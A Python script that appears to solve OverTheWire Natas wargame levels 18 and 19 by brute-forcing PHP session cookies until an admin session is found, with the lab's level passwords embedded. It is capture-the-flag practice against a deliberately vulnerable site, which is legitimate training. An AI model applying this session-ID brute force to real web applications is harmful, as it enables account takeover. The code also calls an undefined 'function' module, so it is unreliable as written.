#!/usr/bin/env python3

import requests
import functions


# url = 'http://natas18.natas.labs.overthewire.org/'
# username = 'natas18'
# password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
# data = {
#     'username': 'admin',
#     'password': '',
# }

# cookie = 0
# for i in range(641):
#     cookie = dict(PHPSESSID=str(i))
#     r = requests.get(url, auth=(username, password), cookies=cookie)
#     print(cookie, end='\r')
#     if 'You are an admin' in r.text:
#         cookie = cookie
#         print(f'SUCCESS!!!! The admin cookie is {cookie}')
#         r = requests.get(url, auth=(username, password), cookies=cookie)
#         print(r.text)
#         break

    ###############################################################################################
                                    #Natas 19
###############################################################################################

url = 'http://natas19.natas.labs.overthewire.org/'
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
data = {
    'username': 'admin',
    'password': '',
}
function.sessionID()

### Used the while loop below to determine what the session ID cookies pattern and length was

# while True:
#     r = requests.post(url, auth=(username, password), data=data)
#     for c in r.cookies:
#         a = str(c.value)
#         print(a)

for i in range(100000):
    cookie = dict(PHPSESSID=str(f'3{i}2d61646d696e'))
    r = requests.get(url, auth=(username, password), cookies=cookie)
    print(cookie, end='\r')
    if 'You are an admin' in r.text:
        cookie = cookie
        print(f'SUCCESS!!!! The admin cookie is {cookie}')
        r = requests.get(url, auth=(username, password), cookies=cookie)
        print(r.text)
        break